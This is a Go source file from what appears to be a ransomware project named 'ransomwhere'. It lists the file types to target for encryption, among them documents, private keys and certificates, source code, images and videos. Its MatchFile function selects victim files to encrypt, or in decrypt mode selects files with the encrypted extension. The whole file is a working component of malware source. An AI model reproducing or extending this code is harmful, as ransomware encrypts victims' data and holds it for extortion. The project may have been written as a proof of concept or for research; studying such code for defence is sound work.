package file

import (
	"github.com/hazcod/ransomwhere/pkg/crypto"
	"path/filepath"
	"strings"
)

var (
	extensions = []string{
		// plain text files
		".txt", ".md", ".conf", ".config", ".pem", ".crt", ".key", ".pfx", ".p12",

		// administrative files
		".docx", ".pdf", ".ppt", ".pptx", ".xml", ".xls", ".ics", ".csv",

		// programming source files
		".go", ".c", ".py", ".pyc", ".java", ".class", ".html", ".css", ".js", ".jar", ".sh", ".bash", ".ps1", ".bat",

		// image files
		".gif", ".png", ".jpg", ".jpeg", ".webp", ".webm",

		// video files
		".mp4", ".mov", ".mkv",
	}
)

// MatchFile will verify whether we want to encrypt (or decrypt) a given file on the current operation mode
func MatchFile(opMode, name string) bool {
	extension := filepath.Ext(name)
	if extension == "" {
		return false
	}

	extension = strings.TrimSpace(strings.ToLower(extension))

	if opMode == OpModeDecrypt {
		return extension == crypto.CryptedExtension
	}

	for _, ext := range extensions {
		if strings.EqualFold(extension, ext) {
			return true
		}
	}

	return false
}
